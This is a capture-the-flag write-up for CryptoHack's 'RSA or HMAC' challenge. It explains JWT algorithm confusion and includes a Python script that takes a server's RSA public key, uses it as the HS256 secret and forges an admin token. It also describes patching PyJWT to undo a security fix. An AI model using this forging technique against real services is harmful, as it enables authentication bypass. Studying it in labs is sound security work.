---
title: "CryptoHack - RSA or HMAC"
author: NiBi
lang: "en"
categories : ['Crypto']
tags : ['Challenge', 'Cryptohack','JWT','JSON','crypto','web']
titlepage: true
toc: true
toc-own-page: true
---

Challenge description : 

```text
There's another issue caused by allowing attackers to specify their own algorithms but not carefully validating them. Attackers can mix and match the algorithms that are used to sign and verify data. When one of these is a symmetric algorithm and one is an asymmetric algorithm, this creates a beautiful vulnerability.

The server is running PyJWT with a small patch to enable an exploit that existed in PyJWT versions <= 1.5.0. To create the malicious signature, you will need to patch or downgrade your PyJWT library too. Use pip show pyjwt to find the location of the PyJWT library on your computer, and edit jwt/algorithms.py to remove the line that was added in the fix for the vulnerability.


Play at http://web.cryptohack.org/rsa-or-hmac

```

Source code : 

```python
import jwt # note this is the PyJWT module, not python-jwt


# Key generated using: openssl genrsa -out rsa-or-hmac-private.pem 2048
with open('challenge_files/rsa-or-hmac-private.pem', 'rb') as f:
   PRIVATE_KEY = f.read()
with open('challenge_files/rsa-or-hmac-public.pem', 'rb') as f:
   PUBLIC_KEY = f.read()

FLAG = ?


@chal.route('/rsa-or-hmac/authorise/<token>/')
def authorise(token):
    try:
        decoded = jwt.decode(token, PUBLIC_KEY, algorithms=['HS256', 'RS256'])
    except Exception as e:
        return {"error": str(e)}

    if "admin" in decoded and decoded["admin"]:
        return {"response": f"Welcome admin, here is your flag: {FLAG}"}
    elif "username" in decoded:
        return {"response": f"Welcome {decoded['username']}"}
    else:
        return {"error": "There is something wrong with your session, goodbye"}


@chal.route('/rsa-or-hmac/create_session/<username>/')
def create_session(username):
    encoded = jwt.encode({'username': username, 'admin': False}, PRIVATE_KEY, algorithm='RS256')
    return {"session": encoded}


@chal.route('/rsa-or-hmac/get_pubkey/')
def get_pubkey():
    return {"pubkey": PUBLIC_KEY}

```

### Solution 

First, i patched by JWT asit's requested in the description.

First of all, I noticed something strange. The token is encoded in "RS256" but the decode function accept both 'RS256' and 'HS256' algorithms. Why? If we encode data with one algorithm we need to decode this data with the same algorithm.

After that, i noticed that the "PUBLIC KEY" is at the second place in the decode function. The second parameter is also where we write the "secret key" for an HS256 algorithm.

We can have the public key thanks to get_pubkey().
We can create a token using HS256 alorithm and sign it with the public key as a secret key ! When the website will receive our token. It will decode our token and see that it's HS256 encoded. It will use the second parameter (public_key) to check if the token is well signed. Because we used this key to sign our payload it will be correct !

I explain more how JWT works in [this write up](../../posts/cryptohack-no-way-jose/)


The decoded payload parts is : 

```json
{
"username" : "admin",
"admin" : "False"
}
```

With python we will generate a token with the same json but we will only replace "admin" : "False" by "admin" : "True"


```python
import requests
import jwt #I patched my JWT as they said.
import json
URL = 'http://web.cryptohack.org//'


def get_pub_key(): #Get the RSA public key
    req=requests.get(URL+f'/rsa-or-hmac/get_pubkey')
    data=json.loads(req.text)['pubkey']
    return data


def login():
    pub_key=get_pub_key()
    token=jwt.encode({'username':'admin','admin':'true'},pub_key,'HS256') #Encoding this payload in HS256 with the public key as secret.
    return token
```

Now, we have our admin crafted token !